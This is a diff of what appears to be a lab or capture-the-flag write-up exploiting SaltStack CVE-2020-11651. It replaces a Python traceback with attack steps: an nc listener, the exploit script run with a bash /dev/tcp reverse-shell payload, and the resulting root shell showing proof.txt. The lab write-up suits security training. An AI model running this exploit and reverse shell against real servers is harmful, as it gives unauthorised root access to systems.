@@ -58,41 +58,29 @@ kali@kali:~$ . ./env/bin/activate
 [+] Checking salt-master (192.168.52.62:4506) status... ONLINE
 [+] Checking if vulnerable to CVE-2020-11651... YES
 [*] root key obtained: yRJf6KcMheGt6fA3HMtk2MP7A+no97bLn63sq9i4VDdZsNsCGRxgP6SPt2vbqwVd9clfjwc5+o8=
-/home/kali/Downloads/CVE_2020_11651.py:364: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
-  jid = '{0:%Y%m%d%H%M%S%f}'.format(datetime.datetime.utcnow())
-/home/kali/Downloads/env/lib/python3.12/site-packages/salt/transport/base.py:281: TransportWarning: Unclosed transport! <salt.transport.zeromq.RequestClient object at 0x7f6b07aa53a0> 
-  File "/home/kali/Downloads/CVE_2020_11651.py", line 376, in <module>
-    main()
+....
 
-  File "/home/kali/Downloads/CVE_2020_11651.py", line 325, in main
-    channel = init_minion(args.master_ip, args.master_port)
+- We can confirm it IS vulnerable. So now, we use the code to carry our payload per its instructions (master tack is the vulnerable IP and 192.168.49.52 is our IP). It is important to use port 4506/4505 for this attack. First, we create a listener in a separate window:
+nc -lvp 4506
+Then run the command in our attack window:
+python3 CVE_2020_11651.py --master 192.168.52.62 --port 4506 --exec 'bash -i >& /dev/tcp/192.168.49.52/4506 0>&1'
 
-  File "/home/kali/Downloads/CVE_2020_11651.py", line 47, in init_minion
-    return salt.transport.client.ReqChannel.factory(minion_config, crypt='clear')
+- Attack looks successful on our listener:
+nc -lvp 4506
+listening on [any] 4506 ...
 
-  File "/home/kali/Downloads/env/lib/python3.12/site-packages/salt/transport/client.py", line 32, in factory
-    return salt.channel.client.ReqChannel.factory(opts, **kwargs)
+192.168.52.62: inverse host lookup failed: Unknown host
+connect to [192.168.49.52] from (UNKNOWN) [192.168.52.62] 53680
+bash: no job control in this shell
+[root@twiggy root]# 
+[root@twiggy root]# id                                              
+id
+uid=0(root) gid=0(root) groups=0(root)
+[root@twiggy root]# ls
+ls
+proof.txt
 
-  File "/home/kali/Downloads/env/lib/python3.12/site-packages/salt/channel/client.py", line 56, in factory
-    return SyncWrapper(
-
-  File "/home/kali/Downloads/env/lib/python3.12/site-packages/salt/utils/asynchronous.py", line 76, in __init__
-    self.obj = cls(*args, **kwargs)
-
-  File "/home/kali/Downloads/env/lib/python3.12/site-packages/salt/channel/client.py", line 138, in factory
-    transport = salt.transport.request_client(opts, io_loop=io_loop)
-
-  File "/home/kali/Downloads/env/lib/python3.12/site-packages/salt/transport/base.py", line 59, in request_client
-    return salt.transport.zeromq.RequestClient(opts, io_loop=io_loop)
-
-  File "/home/kali/Downloads/env/lib/python3.12/site-packages/salt/transport/zeromq.py", line 1069, in __init__
-    super().__init__(opts, io_loop)
-
-  File "/home/kali/Downloads/env/lib/python3.12/site-packages/salt/transport/base.py", line 297, in __init__
-    super().__init__()
-
-  warnings.warn(
-TransportWarning: Enable tracemalloc to get the object allocation traceback
+- Success!
 
 
 
